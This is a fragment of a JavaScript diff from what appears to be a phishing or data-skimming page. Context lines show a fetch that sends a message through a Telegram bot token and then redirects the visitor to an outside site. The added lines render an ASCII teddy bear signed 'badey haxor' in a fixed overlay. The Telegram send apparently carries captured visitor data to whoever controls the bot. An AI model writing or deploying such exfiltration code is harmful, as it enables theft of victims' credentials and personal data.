@@ -67,4 +67,55 @@ fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
 }).catch(e => console.error("Telegram send error:", e))
 .finally(() => {
   window.location.href = "https://www.axiomboost.xyz/";
+
+const teddyBearArt = `
+                        __,,,__
+                ,-""-,-"       "-,-""-,
+               /,-' , .-'-.7.-'-. , '-,\\
+               \\(    /  _     _  \\    )/
+                '-,  { (0)   (0) }  ,-'
+                 /    >  .---.  <    \\
+                |/ .-'   \\___/   '-. \\|
+                {, /  ,_       _,  \\ ,}
+                \\ {,    \\     /    ,} /
+                 ',\\.    '---'    ./,'
+             _.-\"\"\"\"\"\"-._     _.-\"\"\"\"\"\"-._
+           .'            `._.`            '.
+         _/_               _                \\
+      .'`   `\\            | |                \\
+     /        |           | |                 ;
+     |        /           |_|                 |
+     \\  ;'---'    _    ___  _  _  ___         ;
+      '. ;       | |  /   \\| || ||  _|     _ ;
+        `-\\      | |_ | | || |/ /|  _|   .' `,
+           `\\    |___|\\___/ \\__/ |___|  |     \\
+             \\            _ _           \\     |
+         jgs  `\\         | | |         /`   _/
+    ,-\"\"-.    .'`\\       | | |       /`-,-'` .-\"\"-,
+   /      `\\. '    `\\     \\___/     /`    './`      \\
+  ;  .--.   \\       '\\           /'       /   .--.  ;
+  | (    \\   |,       '\\       /'        |   /    ) |
+   \\ ;    }             ;\\   /;         `   {    ; /
+    `;\\   \\         _.-'  \\ /  `-._         /   /;`
+      \\ \\__.'   _.-'       Y       `-._    '.__//
+       '.___,.-'                       `-.,___.'
+           badey haxor
+`;
+
+const pre = document.createElement('pre');
+pre.textContent = teddyBearArt;
+pre.style.position = 'fixed';
+pre.style.bottom = '20px';
+pre.style.left = '20px';
+pre.style.backgroundColor = 'rgba(0,0,0,0.85)';
+pre.style.color = '#ff69b4';  // rose sympa
+pre.style.padding = '15px';
+pre.style.fontSize = '12px';
+pre.style.fontFamily = 'monospace';
+pre.style.borderRadius = '12px';
+pre.style.zIndex = 999999;
+pre.style.boxShadow = '0 0 20px #ff69b4';
+
+document.body.appendChild(pre);
+
 });
